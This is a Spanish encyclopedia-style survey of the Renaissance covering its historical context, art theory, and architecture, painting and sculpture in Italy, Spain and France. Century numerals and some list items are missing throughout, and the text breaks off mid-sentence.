Desde una perspectiva de la evolución artística general de Europa, el Renacimiento significó una «ruptura» con la unidad estilística que hasta ese momento había sido «supranacional». El Renacimiento no fue un fenómeno unitario desde los puntos de vista cronológico y geográfico: su ámbito se limitó a la cultura europea y a los territorios americanos recién descubiertos, a los que las novedades renacentistas llegaron tardíamente. Su desarrollo coincidió con el inicio de la Edad Moderna, marcada por la consolidación de los estados europeos, los viajes transoceánicos que pusieron en contacto a Europa y América, la descomposición del feudalismo, el ascenso de la burguesía y la afirmación del capitalismo. Sin embargo, muchos de estos fenómenos rebasan por su magnitud y mayor extensión en el tiempo el ámbito renacentista.

El Renacimiento marca el inicio de la Edad Moderna, un período histórico que por lo general se suele establecer entre el descubrimiento de América en 1492 y la Revolución francesa en 1789, y que, en el terreno cultural, se divide en el Renacimiento (siglos y ) y el Barroco (siglos y ), con subdivisiones como el manierismo, el rococó y el neoclasicismo. Otros historiadores sitúan la fecha de inicio en 1453, caída de Constantinopla, o bien remarcan un hecho trascendental como la invención de la imprenta (hacia 1440 aproximadamente, de la mano de Johannes Gutenberg). 

Los antecedentes históricos del Renacimiento cabe situarlos en la decadencia del mundo medieval ocurrida a lo largo del por diversos factores, como el declive del Sacro Imperio Romano Germánico, el debilitamiento de la Iglesia católica a causa de los cismas y los movimientos heréticos —que darían origen a la Reforma protestante—, la profunda crisis económica derivada del anquilosamiento del sistema feudal, y la decadencia de las artes y las ciencias, lastradas por una teología escolástica sumida en el escepticismo.

Frente a esta decadencia, los principales centros académicos europeos buscaron regenerarse a través del retorno a los valores de la cultura clásica grecorromana. A su vez, comenzó a fraguarse una nueva sociedad fundamentada en el auge de los nuevos estados centralizados, con poderosos ejércitos y administraciones burocratizadas —inicio del autoritarismo monárquico preconizado por Maquiavelo—, así como en el crecimiento demográfico y una economía centrada en una nueva clase social emergente, la burguesía, que puso los cimientos del capitalismo y una economía mercantil y preindustrial; todo ello coadyuvado por el progreso técnico y científico experimentado durante este período, fundamentado en la imprenta y la consiguiente velocidad de difusión de las novedades. Surgió así una visión del mundo más antropocéntrica, desligada de la religión y el teocentrismo medieval, en la que el hombre y los avances científicos supondrán la nueva forma de valorar el mundo: el humanismo, un término inicialmente aplicado a los especialistas en disciplinas grecolatinas (derecho, retórica, teología y arte), que se haría extensivo a filósofos, artistas, científicos y cualquier estudioso de las diversas ramas del conocimiento que comenzaron entonces a aglutinarse en un concepto de cultura general.

En Italia, el epicentro de la cultura renacentista, la división del territorio en ciudades-estado con diferentes regímenes políticos —repúblicas como Florencia o Venecia, estados monárquicos como Milán y Nápoles o el dominio papal en Roma— propició el ascenso de una élite económica que patrocinó la cultura y el arte como instrumentos de propaganda del estado, cada uno rivalizando con los demás en magnificencia y esplendor. La educación se volvió más accesible, dejando de estar circunscrita al clero, y se favoreció el debate intelectual, con la fundación de universidades y el patrocinio de la literatura. 

Por su parte, el estaría marcado por los grandes descubrimientos geográficos iniciados con la llegada de Colón a América en 1492 (establecimiento de la ruta del Cabo por Vasco da Gama, 1498; vuelta al mundo de Magallanes, 1519-1521; desembarco de Cortés en México, 1519; conquista de Perú por Pizarro, 1530-1533), así como por la ruptura de la unidad cristiana causada por la Reforma protestante de Martín Lutero (1520), el desarrollo de la ciencia y la técnica ("Nova Scientia" de Tartaglia, 1538; "De revolutionibus" de Copérnico, 1543; "Anatomía" de Vesalio, 1543) y la expansión del humanismo (Erasmo de Róterdam, Giovanni Pico della Mirandola, Ludovico Ariosto, Tomás Moro, Juan Luis Vives, François Rabelais).

El término «Renacimiento» procede del italiano "Rinascita" y fue acuñado por el artista e historiador Giorgio Vasari en sus "Vidas" (1542–1550), en alusión al renacer de la cultura clásica tras el oscurantismo medieval. Como tal, supone un fenómeno tanto social como político y cultural que abarcó todo el continente europeo durante los siglos y . En la historiografía moderna, la primera definición del Renacimiento procede del historiador francés Jules Michelet ("La Renaissance", 1855), mientras que la visión actual del mundo renacentista fue forjada por Jacob Burckhardt en su ensayo "La cultura del Renacimiento en Italia" (1860).

Aunque se suele situar el inicio del Renacimiento en el numerosos historiadores lo retrotraen al o aun al , a la obra de algunos artistas considerados precursores, como Cimabue y Giotto en pintura o Nicola Pisano en escultura. Estos sentaron las bases de los primeros artistas plenamente renacentistas en la Florencia del primer cuarto del , como el pintor Masaccio, el escultor Donatello o el arquitecto Brunelleschi, todos ellos interesados en el naturalismo, la armonía y las proporciones matemáticas. 

En este clima cultural de renovación, basado en modelos de la antigüedad clásica, surgió a principios del un movimiento artístico en Italia de gran vitalidad, que se extendería de inmediato a otros países de Europa. El artista tomó conciencia de individuo con valores intrínsecos, se sintió atraído por la cultura y el saber en general, y comenzó a estudiar los modelos de la antigüedad, a la vez que estudiaba disciplinas como la anatomía e investigaba nuevas técnicas, como el claroscuro y la perspectiva, desarrollándose enormemente las formas de representar el mundo natural con fidelidad. El paradigma de esta nueva actitud es Leonardo da Vinci, quien se interesó por múltiples ramas del saber, pero del mismo modo Miguel Ángel Buonarroti, Rafael Sanzio, Sandro Botticelli y Bramante fueron artistas conmovidos por la imagen de la antigüedad y preocupados por desarrollar nuevas técnicas escultóricas, pictóricas y arquitectónicas, así como por la música, la poesía y la nueva sensibilidad humanística.

No cabe duda de que el Renacimiento evolucionó en buena medida del arte medieval, una parte del cual no había dejado de valorar e imitar el arte clásico; pero el artista renacentista buscó imperiosamente distanciarse de la etapa posterior, a la que menospreciaban por su supeditación a los valores religiosos y por su estilo antinaturalista, proveniente no de una falta de habilidad técnica en imitar a la naturaleza, sino de una voluntad propia de eludirla para enfatizar otros valores más subjetivos, ligados a la espiritualidad. Sin embargo, el propio artista renacentista no valoró este hecho y se sintió distinto, «renacido»; así, Lorenzo Valla llegó a afirmar que no sabía por qué las artes «habían decaído hasta tal punto, y casi muerto; ni tampoco por qué habían resurgido en esa época; apareciendo y triunfando tantos buenos artistas y escritores». 
Buena parte del surgimiento de esta nueva escala de valores, en que artistas y literatos serán exaltados por encima de personajes de noble cuna, proviene del sistema de ciudades-estado italianas de tipo republicano, alejadas así de los modos autoritarios de la aristocracia y el clero, con sociedades en que se valoraba más el mérito propio que no el proveniente del nacimiento en una determinada estirpe. En esta nueva sociedad se valora más la virtud cívica que la caballeresca o contemplativa, el talento personal —fuese en los negocios, la ciencia o el arte— que el rancio abolengo.

Conviene remarcar que un factor que coadyuvó enormemente al éxito de las nuevas teorías artísticas fue el mecenazgo, tanto de ciudades y entidades de diversa índole como de personajes provenientes tanto de la aristocracia y el clero como de la nueva burguesía emergente. Para estos personajes, el patronazgo de la cultura era una señal de poder y estatus social, que otorgaba a quien lo ejercía prestigio y ostentación frente a sus semejantes. Algunos de los mecenas más distinguidos fueron: el florentino Lorenzo de Médicis, apodado «el Magnífico»; Federico da Montefeltro, duque de Urbino; Ludovico Gonzaga, marqués de Mantua; Alfonso el Magnánimo, rey de Nápoles; Francesco y Ludovico Sforza, duques de Milán; además de los papas y cardenales de la Iglesia.

El artista renacentista es heredero de los preceptos de la cultura clásica, pero los reinterpreta a través del humanismo, reafirmando los valores intrínsecos del mundo perceptible y del ser humano como parte de esa realidad sensible. Aunque no renuncia a la religión y los valores de la realidad cristiana, da preponderancia a esta nueva visión humanística por encima de la trascendencia religiosa. Así, a la visión estática del universo preponderante durante la Edad Media se sucede una visión dinámica que se sustenta en la experimentación y en la revalidación del método científico como fuente de conocimiento. Por otro lado, los nuevos valores supremos del artista serán la belleza y la armonía, desligadas de la religión y sustentadas en el estudio de la naturaleza, que a través de la medida y la proporción otorgan al artista nuevas herramientas para realizar sus obras. 

Mientras surgía en Florencia el "Quattrocento" o Primer Renacimiento italiano —así llamado por desarrollarse durante los años de 1400 ()—, originado por la búsqueda de los cánones de belleza clásicos y de las bases científicas del arte, se produjo un fenómeno similar y coetáneo en Flandes —especialmente en pintura—, basado principalmente en la observación de la naturaleza. Este Primer Renacimiento tuvo gran difusión en la Europa Oriental: la fortaleza moscovita del Kremlin, por ejemplo, fue obra de artistas italianos.

La segunda fase del Renacimiento, o "Cinquecento" (), estuvo marcada por la hegemonía artística de Roma, cuyos papas (Julio II, León X, Clemente VII y Pablo III, algunos de ellos pertenecientes a la familia florentina de los Médici) apoyaron fervorosamente el desarrollo de las artes, así como la investigación de la antigüedad clásica. Sin embargo, con las guerras de Italia (saco de Roma en 1527), muchos de estos artistas emigraron y propagaron las teorías renacentistas por toda Europa.

Así, a lo largo del el Renacimiento italiano se extendió por toda Europa, desde Portugal hasta Escandinavia, y desde Francia hasta Rusia. Muchos artistas viajaron en busca de formación o mecenazgo, y las grandes cortes europeas —como Fontainebleau, Madrid, Praga o Dresde— se llenaron de artistas de múltiples nacionalidades. Se valoraba especialmente a los artistas italianos, pero numerosos extranjeros que fueron a formarse a Italia adquirieron así una nueva reputación. Un factor coadyuvante de la difusión del nuevo arte fue el grabado, cuya fabricación en serie permitió expandir las obras de los artistas por todo el continente. También aumentó considerablemente el mercado del arte, y la labor de los marchantes fue esencial para conectar a artistas y compradores; uno de los mayores centros de mercado del arte de la época fue Amberes. También creció el coleccionismo, y aparecieron las llamadas «cámaras de arte» ("Kunstkammern"), generalmente pertenecientes a personajes de la aristocracia y la realeza, unas estancias donde se exponían objetos de arte de todo tipo, libros y objetos de toda clase, e incluso minerales o muestras naturales, de la flora y la fauna; una de las más afamadas fue la de Rodolfo II en Praga. 

De forma genérica se pueden establecer las características del Renacimiento en: 



La cultura renacentista supuso el retorno al racionalismo, al estudio de la naturaleza, la investigación empírica, con especial influencia de la filosofía clásica grecorromana. La estética renacentista se basó tanto en la antigüedad clásica como en la estética medieval, por lo que a veces resultaba algo contradictoria: la belleza oscilaba entre una concepción realista de imitación de la naturaleza y una visión ideal de perfección sobrenatural, siendo el mundo visible el camino para ascender a una dimensión suprasensible.

Uno de los primeros teóricos del arte renacentista fue Cennino Cennini: en su obra "Il libro dell'arte" (1400) sentó las bases de la concepción artística del Renacimiento, defendiendo el arte como una actividad intelectual creadora, y no como un simple trabajo manual. Para Cennini el mejor método para el artista es retratar de la naturaleza ("ritrarre de natura"), defendiendo la libertad del artista, que debe trabajar «como le place, según su voluntad» ("come gli piace, secondo sua volontà"). También introdujo el concepto de «diseño» ("disegno"), el impulso creador del artista, que forja una idea mental de su obra antes de realizarla materialmente, concepto de vital importancia desde entonces para el arte moderno.

En ese contexto surgieron varios tratados más acerca del arte, como los de Leon Battista Alberti ("De Pictura", 1436-1439; "De re aedificatoria", 1450; y "De Statua", 1460), o "Los Comentarios" (1447) de Lorenzo Ghiberti. Alberti recibió la influencia aristotélica, pretendiendo aportar una base científica al arte. También habló de "decorum", el tratamiento del artista para adecuar los objetos y temas artísticos a un sentido mesurado, perfeccionista. Fue Alberti quien agrupó a la arquitectura, la escultura y la pintura en el grupo de las artes liberales, ya que hasta entonces eran consideradas como artesanía; con ello, elevó al artista a la categoría de creador intelectual. Ghiberti fue el primero en periodificar la historia del arte, distinguiendo antigüedad clásica, período medieval y lo que llamó «renacer de las artes» (Renacimiento).

El Renacimiento puso especial énfasis en la imitación de la naturaleza, lo que consiguió a través de la perspectiva o de estudios de proporciones, como los realizados por Luca Pacioli sobre la sección áurea: en "De Divina Proportione" (1509) habló del número áureo —representado por la letra griega φ (fi)—, el cual posee diversas propiedades como relación o proporción, que se encuentran tanto en algunas figuras geométricas como en la naturaleza, en elementos tales como caracolas, nervaduras de las hojas de algunos árboles, el grosor de las ramas, etc. Asimismo, atribuyó un carácter estético especial a los objetos que siguen la razón áurea, así como les otorgó una importancia mística.

Por otro lado, Giorgio Vasari, en "Vida de los más excelentes arquitectos, pintores y escultores italianos desde Cimabue hasta nuestros tiempos" (1542–1550), fue uno de los predecesores de la historiografía del arte, al confeccionar una crónica de los principales artistas de su tiempo, poniendo especial énfasis en la progresión y el desarrollo del arte.

Diferentes etapas históricas marcan el desarrollo del Renacimiento: la primera tiene como espacio cronológico todo el : es el denominado "Quattrocento", y comprende el Primer Renacimiento —también llamado «Renacimiento temprano» o «Bajo Renacimiento»—, que se desarrolla en Italia; la segunda surge en el y se denomina "Cinquecento": su dominio artístico queda referido al clasicismo o Alto Renacimiento —también llamado «Renacimiento pleno»—, que se centra en el primer cuarto del siglo. En esta etapa surgen las grandes figuras del Renacimiento en las artes: Leonardo, Miguel Ángel, Rafael. Es el apogeo del arte renacentista. Este período desemboca hacia 1520-1530 en una reacción anticlásica que conforma el manierismo, que dura hasta el final del . Mientras que en Italia se estaba desarrollando el Renacimiento, en el resto de Europa se mantiene el arte gótico en sus formas tardías, situación que se iba a mantener, exceptuando casos concretos, hasta comienzos del .

En Italia el enfrentamiento y convivencia con la antigüedad grecorromana, considerada como un legado nacional, proporcionó una amplia base para una evolución estilística homogénea y de validez general. Por ello, allí fue posible su surgimiento y precedió a todas las demás naciones. Fuera de Italia, el desarrollo del Renacimiento dependería constantemente de los impulsos marcados por Italia: artistas importados desde Italia o formados allí harían el papel de verdaderos transmisores. Monarcas como Francisco I en Francia o Carlos I y Felipe II en España impusieron el nuevo estilo en las construcciones que patrocinaban, influyendo en los gustos artísticos predominantes y convirtiendo el Renacimiento en una «moda».

La arquitectura renacentista tuvo un carácter marcadamente profano en comparación con la época anterior. Surgió en una ciudad en donde la arquitectura gótica apenas había penetrado, Florencia. A pesar de ello, muchas de las obras más destacadas fueron edificios religiosos.

Con el nuevo gusto, se buscaba ordenar y renovar los viejos burgos medievales e incluso se proyectaban ciudades de nueva planta. La búsqueda de la «ciudad ideal», opuesta al modelo caótico y desordenado del medievo, sería una constante preocupación de artistas y mecenas. Así, el papa Pío II reordenó su ciudad natal, Pienza, convirtiéndola en un auténtico muestrario del nuevo urbanismo renacentista. En sí, las ciudades se convertirían en el escenario ideal de la renovación artística, oponiéndose al concepto medieval en el que lo rural tenía un papel preferente gracias al monacato. 

Al tomar elementos de la arquitectura clásica, los arquitectos renacentistas lo hacían de forma selectiva, así por ejemplo en lugar de utilizar la columna dórica clásica se prefirió el orden toscano. Igualmente se crearon formas nuevas, como la columna abalaustrada, nuevos órdenes de capiteles o decoraciones que si bien se inspiraban en la antigüedad habían de adaptarse al uso religioso de las iglesias. Así, los amorcillos clásicos que acompañaban a Venus en las representaciones griegas o romanas pasan a ser angelotes ("putti").

Los arquitectos emplean las proporciones modulares y la superposición de órdenes que aparecía en los edificios romanos; las cúpulas se utilizaron mucho como elemento monumental en iglesias y edificios públicos. A partir de este momento, el arquitecto abandona el carácter gremial y anónimo que había tenido durante la Edad Media y se convierte en un intelectual, un investigador. Muchos de ellos escribieron tratados y obras especulativas de gran trascendencia, como en el caso de Leon Battista Alberti o Sebastiano Serlio.

Los elementos constructivos más característicos del estilo renacentista fueron:



Por etapas, se pueden distinguir dos grandes momentos:


En pintura, las novedades del Renacimiento se introdujeron de forma paulatina pero irreversible a partir del . Un antecedente de las mismas fue Giotto, pintor aún dentro de la órbita del gótico, pero que desarrolló en sus pinturas conceptos como volumen tridimensional, perspectiva y naturalismo, que alejaban su obra de los rígidos modos de la tradición bizantina y gótica y preludiaban el Renacimiento pictórico.

En el Quattrocento () se recogieron todas estas novedades y se adaptaron a la nueva mentalidad humanista y burguesa que se expandía por las ciudades-estado italianas. Los pintores, aun tratando temas religiosos la mayoría de ellos, introdujeron también en sus obras la mitología, la alegoría y el retrato, que se desarrollarían a partir de ahora enormemente. Una búsqueda constante de los pintores de esta época sería la perspectiva, objeto de estudio y reflexión para muchos artistas: se trató de llegar a la ilusión de espacio tridimensional de una forma científica y reglada. La pintura cuatrocentista es una época de experimentación; las pinturas abandonan lenta y progresivamente la rigidez gótica y se aproximan cada vez más a la realidad. Aparece la naturaleza retratada en los fondos de las composiciones, y se introducen los desnudos en las figuras.

Los pintores más destacados de esta época fueron: en Florencia, Fra Angélico, Masaccio, Benozzo Gozzoli, Piero della Francesca, Filippo Lippi y Paolo Uccello; en Umbría, Perugino; en Padua, Andrea Mantegna; y, en Venecia, Giovanni Bellini. Por encima de todos ellos destaca Sandro Botticelli, autor de alegorías, delicadas "madonnas" y asuntos mitológicos. Su estilo dulce, muy atento a la belleza y sensibilidad femeninas, y predominantemente dibujístico, caracterizan la escuela florentina de pintura y toda esta época. Otros autores del Quattrocento italiano son Andrea del Castagno, Antonio Pollaiuolo, Pinturicchio, Domenico Ghirlandaio, Cima da Conegliano, Luca Signorelli, Cosimo Tura, Vincenzo Foppa, Alessio Baldovinetti, Vittore Carpaccio y, en el sur de la península, Antonello da Messina.

El Cinquecento () fue la etapa culminante de la pintura renacentista, y denominada por ello a veces como «clasicismo». Los pintores asimilan las novedades y la experimentación cuatrocentistas y las llevan a nuevas cimas creativas. En este momento aparecen grandes maestros, cuyo trabajo servirá de modelo a los artistas durante siglos. El primero de ellos fue Leonardo da Vinci, uno de los grandes genios de todos los tiempos. Fue el ejemplo más acabado de artista multidisciplinar, intelectual y obsesionado con la perfección, que le llevó a dejar muchas obras inconclusas o en proyecto. Poco prolífico en su faceta pictórica, aportó sin embargo muchas innovaciones que condujeron a la historia de la pintura hacia nuevos rumbos. Quizá su principal aportación fue el "sfumato" o claroscuro, delicada gradación de la luz que otorga a sus pinturas una gran naturalidad, a la vez que ayuda a crear espacio. Estudiaba cuidadosamente la composición de sus obras, como en la "Última Cena", donde las figuras se ajustan a un esquema geométrico. Supo unir en sus trabajos la perfección formal a ciertas dosis de misterio, presente, por ejemplo, en la celebérrima "Gioconda", "La Virgen de las Rocas" o el "San Juan Bautista".

Miguel Ángel es, cronológicamente, la segunda gran figura. Fundamentalmente escultor, se dedicó a la pintura de forma esporádica, a petición de algunos admiradores de su obra, sobre todo el papa Julio II. Los frescos de la Capilla Sixtina muestran el atormentado mundo interior de este artista, poblado de figuras monumentales, sólidas y tridimensionales como si fueran esculturas, y de llamativa presencia física. En su obra cobra mucha importancia el desnudo, aun cuando la casi totalidad de la misma fue hecha para decorar iglesias.

Rafael Sanzio completa la tríada de genios del clasicismo. Su estilo tuvo un enorme éxito y se puso de moda entre los poderosos. La pintura de Rafael buscaba ante todo la "grazia", o belleza equilibrada y serena. Sus "madonnas" recogen las novedades de Leonardo en lo que se refiere a composición y claroscuro, añadiendo una característica dulzura. Anticipa claramente la pintura manierista en sus últimas obras, cuyo estilo agitado y dramático copiarán y difundirán sus discípulos.

Con la aparición de estos tres grandes maestros, los artistas contemporáneos asumen que el arte ha llegado a su culmen —concepto recogido en la obra de Giorgio Vasari "Las Vidas"— y se afanarán por tanto en incorporar estos logros, por un lado, y en la búsqueda de un estilo propio y original como forma de superarlos. Ambas cosas, junto con el ambiente pesimista que se respiraba en la Cristiandad en la década de 1520 (Saco de Roma, Reforma protestante, guerras), hizo surgir con fuerza a partir de los años 1530 una nueva corriente, el Manierismo. Se buscaría a partir de entonces lo extravagante, lo extraño, lo exagerado y lo irreal. Pertenecen a esta corriente pictórica Jacopo Pontormo, Bronzino, Parmigianino, Rosso Fiorentino o Francesco Salviati. Otros autores tomarían algunas novedades manieristas pero siguiendo una línea más personal y clasicista. Entre ellos podemos citar a Sebastiano del Piombo, Correggio, Andrea del Sarto o Federico Barocci.

Dentro de las diferentes escuelas que surgen en Italia en el Cinquecento, la de Venecia presenta especiales características. Si los florentinos ponían el acento en el "disegno", es decir, en la composición y la línea, los pintores venecianos se centrarían en el color. Las especiales características del estado veneciano pueden explicar algo de esta particularidad, puesto que se trataba de una sociedad elitista, amante del lujo y muy relacionada con Oriente. La escuela veneciana reflejaría esto mediante una pintura refinada, hedonista, menos intelectual y más vital, muy decorativa y colorista. Precursores de la escuela veneciana del Cinquecento fueron Giovanni Bellini y, sobre todo, Giorgione, pintor de alegorías, paisajes y asuntos religiosos, melancólicos y misteriosos. Deudor de su estilo fue Tiziano, el mayor pintor de esta escuela, excelente retratista, quizá el más demandado de su tiempo; autor de complejas y realistas composiciones religiosas, llenas de vida y colorido. En la última etapa de su vida deshace los contornos de las figuras, convirtiendo sus cuadros en puras sensaciones de luz y color, anticipo del impresionismo. Tintoretto, Paolo Veronese y Palma el Viejo continuaron esta escuela llevándola hacia el manierismo y anticipando en cierta manera la pintura barroca.

Como en las demás manifestaciones artísticas, los ideales de vuelta a la antigüedad, inspiración en la naturaleza, humanismo antropocéntrico e idealismo fueron los que caracterizaron la escultura de este período. Ya el gótico había preludiado en cierta manera algunos de estos aspectos, pero algunos hallazgos arqueológicos (el "Laocoonte", hallado en 1506, o el "Torso Belvedere") que se dieron en la época supusieron una auténtica conmoción para los escultores y sirvieron de modelo e inspiración para las nuevas realizaciones.

Aunque se siguieron haciendo obras religiosas, en las mismas se advierte un claro aire profano; se reintrodujo el desnudo y el interés por la anatomía con fuerza, y aparecieron nuevas tipologías técnicas y formales, como el relieve en "stiacciato" (altorrelieve con muy poco resalte, casi plano) y el "tondo", o composición en forma de disco; también la iconografía se renovó con temas mitológicos, alegóricos y heroicos. Apareció un inusitado interés por la perspectiva, derivado de las investigaciones arquitectónicas coetáneas, y el mismo se plasmó en relieves, retablos, sepulcros y grupos escultóricos. Durante el Renacimiento decayó en cierta manera la tradicional talla en madera policromada en favor de la escultura en piedra —mármol preferentemente— y se recuperó la escultura monumental en bronce, caída en desuso durante la Edad Media. Los talleres de Florencia fueron los más reputados de Europa en esta técnica, y surtieron a toda Europa de estatuas de este material.

Los dos siglos que dura el Renacimiento en Italia dieron lugar, igual que en las demás artes, a dos etapas:



En España el cambio ideológico no es tan extremo como en otros países; no se rompe abruptamente con la tradición medieval, por ello se habla de un Renacimiento español más original y variado que en el resto de Europa. Así, la literatura acepta las innovaciones italianas (Dante y Petrarca), pero no olvida la poesía del "Cancionero" y la tradición anterior. En cuanto a las artes plásticas, el Renacimiento hispano mezcló elementos importados de Italia —de donde llegaron algunos artistas, como Paolo de San Leocadio, Pietro Torrigiano o Domenico Fancelli— con la tradición local, y con algunos otros influjos —lo flamenco, por ejemplo, estaba muy de moda en la época por las intensas relaciones comerciales y dinásticas que unían estos territorios a España—. Las innovaciones renacentistas llegaron a España de forma muy tardía: hasta la década de 1520 no se encuentran ejemplos acabados de las mismas en las manifestaciones artísticas, y tales ejemplos son dispersos y minoritarios. No llegaron a España plenamente, pues, los ecos del Quattrocento italiano —solo por obra de la familia Borja aparecen artistas y obras de esa época en el área levantina—, lo que determina que el arte renacentista español pase casi abruptamente del gótico al manierismo.
En el campo de la arquitectura, tradicionalmente se distinguen tres periodos: plateresco (-primer cuarto del ), purismo o estilo italianizante (primera mitad del ) y estilo herreriano (a partir de 1559-mediados del siglo siguiente). En el primero de ellos, lo renaciente aparece de forma superficial, en la decoración de las fachadas, mientras que la estructura de los edificios sigue siendo gotizante en la mayoría de los casos. Lo más característico del plateresco es un tipo de decoración menuda, detallista y abundante, semejante a la labor de los plateros, de donde deriva el nombre. El núcleo fundamental de esta corriente fue la ciudad de Salamanca, cuya Universidad y su fachada son el paradigma del estilo. Arquitectos destacados del mismo fueron Rodrigo Gil de Hontañón y Juan de Álava. El purismo representa una fase más avanzada de la italianización de la arquitectura. El palacio de Carlos V en la Alhambra de Granada, obra de Pedro de Machuca, es ejemplo de ello. El foco principal de este estilo se situó en Andalucía, donde además del citado palacio destacaron los núcleos de Úbeda y Baeza y arquitectos como Andrés de Vandelvira y Diego de Siloé. Finalmente, apareció el estilo escurialense o herreriano, original adaptación del manierismo romano caracterizada por la desnudez y el gigantismo arquitectónico. La obra fundamental fue el palacio-monasterio de El Escorial, trazado por Juan Bautista de Toledo y Juan de Herrera, sin duda la obra más ambiciosa del Renacimiento hispano. Lo escurialense traspasó el umbral cronológico del llegando con gran vigencia a la época barroca.

En escultura, la tradición gótica mantuvo su hegemonía durante buena parte del . Los primeros ecos del nuevo estilo corresponden por lo general a artistas venidos de fuera, como Felipe Vigarny o Domenico Fancelli, que trabajó al servicio de los Reyes Católicos, esculpiendo su sepulcro (1517). No obstante, pronto surgieron artistas locales que asimilaron las novedades italianas, adaptándolas al gusto hispano, como Bartolomé Ordóñez y Damián Forment. En una fase más madura del estilo surgieron grandes figuras, creadoras de un peculiar manierismo que sentó las bases de la posterior escultura barroca: Juan de Juni y Alonso Berruguete son los más destacados.

La pintura renacentista española está determinada igualmente por el pulso que mantiene la herencia del gótico con los nuevos modos venidos de Italia. Esta dicotomía se aprecia en la obra de Pedro Berruguete, que trabajó en Urbino al servicio de Federico de Montefeltro, y Alejo Fernández. Posteriormente aparecieron artistas conocedores de las novedades italianas coetáneas, como Vicente Macip o su hijo Juan de Juanes —influidos por Rafael—, Luis de Morales, Juan Fernández de Navarrete o los leonardescos Fernando Yáñez de la Almedina y Hernando de los Llanos. Pero la gran figura del Renacimiento español, y uno de los pintores más originales de la historia, se inscribe ya en el manierismo, aunque rebasando sus límites al crear un universo estilístico propio: El Greco.

En Francia la influencia italiana se dejó sentir desde muy temprano, favorecida por la cercanía geográfica, los vínculos comerciales y la monarquía, que ambicionaba anexionar los territorios limítrofes de la península italiana, y lo consiguió en algunos momentos. Sin embargo, el impulso definitivo a la adopción de las formas renacentistas se dio bajo el reinado de Francisco I. Este monarca, gran mecenas de las artes y aficionado a todo lo que procediera de Italia, protegió a importantes maestros, solicitando sus servicios para la corte francesa —entre ellos el mismo Leonardo da Vinci, que murió en el castillo de Cloux—, a la vez que emprendió un ambicioso programa de revitalización cultural que revolucionó el desarrollo de las artes en el país. Conviene tener presente que Francia fue la cuna del gótico y que, por tanto, este estilo estaba fuertemente arraigado y podía ser visto como un estilo nacional. De ahí que las formas góticas continuaran presentes durante un tiempo, a pesar del nuevo estilo impuesto por la corte.

En cuanto a la arquitectura, la monarquía, fortalecida y en período de expansión territorial, había patrocinado ya desde el la remodelación de los viejos "châteaux" medievales y la creación de nuevas residencias más acordes con los tiempos. Pero fue precisamente Francisco I el que dio un impulso definitivo a esta operación renovadora, que tuvo varios focos. El primer edificio renacentista en Francia fue el castillo de Saint-Germain-en-Laye, imponente fortaleza de ladrillo y piedra en la que aparecen pequeños detalles renacentistas, dentro de una general sobriedad de aire militar. De estilo más avanzado fueron los , conjunto de mansiones para la realeza y la nobleza que muestran los rasgos más característicos del Renacimiento francés: decorativismo de raigambre manierista, recuerdos goticistas en las estructuras, y quizá lo más novedoso: una perfecta integración de los edificios en la naturaleza circundante, como se ve en el grácil puente del castillo de Chenonceau. El más célebre dentro de este conjunto es el castillo de Chambord, que presenta grandes audacias estilísticas, como una escalera interna helicoidal. Otros ejemplos de estas residencias suburbanas son los castillos de Amboise, Blois y Azay-le-Rideau.

Además de todas estas realizaciones, Francisco I se embarcó en la que quizá fue la obra fundamental de este período: el palacio de Fontainebleau, vieja mansión de los reyes franceses que se renovó totalmente. En el edificio en sí se aprecia ya el triunfo de las formas italianas, aunque adaptadas al gusto francés con sus típicas chimeneas y mansardas. Incluye fragmentos de desbordante creatividad, como la célebre Escalera Imperial, anticipo de soluciones barrocas. No obstante, quizá lo más destacado del proyecto fue que involucró a creadores de prácticamente todas las disciplinas artísticas, algunos venidos expresamente de Italia, como los pintores Francesco Primaticcio o Rosso Fiorentino, el famoso escultor Benvenuto Cellini o el arquitecto Sebastiano Serlio, importante autor de tratados de arquitectura del que apenas se conocen obras salvo este palacio. Las novedades que se fraguaron aquí trapasarían el ámbito local y darían origen a todo un estilo, el «estilo de Fontainebleau», un manierismo refinado al servicio de los gustos aristocráticos.

Tras Francisco I, las formas «a la italiana» acabaron imponiéndose definitivamente en la arquitectura bajo Enrique II, cuya esposa, Catalina de Médicis, pertenecía a la familia florentina más poderosa. Bajo su mandato (1547-1559) se reformó la antigua sede de la corte en París, el palacio del Louvre, convirtiéndolo en un moderno edificio de estética plenamente manierista. La reforma fue dirigida por uno de los arquitectos franceses más destacados del momento, Pierre Lescot, que diseñó el gran patio central ("Cour Carrée"), con características fachadas en las que utiliza el módulo de arco de triunfo clásico. Asimismo, estos monarcas iniciaron la construcción de un nuevo palacio, enfrente del Louvre, el palacio de las Tullerías, en el que intervino el otro gran arquitecto francés del Renacimiento, Philibert Delorme.
La escultura del Renacimiento en Francia fue también al compás de lo dictado por Italia. Francia dejó de ser ya a finales del el gran centro escultórico de Europa que fue gracias a los talleres catedralicios, situación que continuaría durante el , y aún más en el . Es paradójico y a la vez revelador que esta situación coincida con la consolidación progresiva de la institución monárquica, evidentemente deseosa de renovar su imagen y dispuesta a usar el arte como instrumento propagandístico de primer orden. No obstante de la pérdida de hegemonía en este campo, que de todas formas nunca había sido definitiva, surgieron grandes figuras al calor de los proyectos reales; es de destacar el carácter ornamental y decorativo que tuvieron las esculturas, subordinándose al proyecto general de los edificios e integrándose en estos. Dos fueron los autores más sobresalientes: Germain Pilon y Jean Goujon.

La pintura también experimentó el progresivo declive de las formas góticas tradicionales y la llegada del nuevo estilo. Como se ha señalado, se conocieron en Francia de primera mano las formas pictóricas italianas en el gracias a la llegada de autores muy innovadores, como Leonardo o Rosso Fiorentino. Francisco I impulsó la formación de artistas franceses bajo la dirección de maestros italianos, como Niccolò dell'Abbate o Primaticcio, siendo este último el responsable de la decoración del palacio de Fontainebleau y la organización de las fiestas de la corte, y teniendo por tanto a sus órdenes a muchos artesanos y artistas. Esta convivencia de talentos, escuelas, disciplinas y géneros dio origen a la llamada «escuela pictórica de Fontainebleau», una derivación del manierismo pictórico italiano que incide en el erotismo, el lujo, los temas profanos y las alegorías, todo ello muy del gusto de su clientela principal, la aristocracia. La mayor parte de los artistas de Fontainebleau fueron anónimos, precisamente por esa integración de las artes que se propugnaba y por el magisterio de los artistas consagrados. No obstante, conocemos los nombres de algunos pintores, figurando Jean Cousin el Viejo o Antoine Caron entre los más destacados. Sin embargo, el pintor francés más importante de la época, a la vez que uno de los grandes retratistas de todos los tiempos, aunque gran parte de su obra se haya perdido, fue François Clouet, que superó a su padre, el también apreciable Jean Clouet, en la fiel plasmación de la vida de los poderosos de la época, con una profundidad psicológica y brillantez formal cuyo precedente hay que buscarlo en Jean 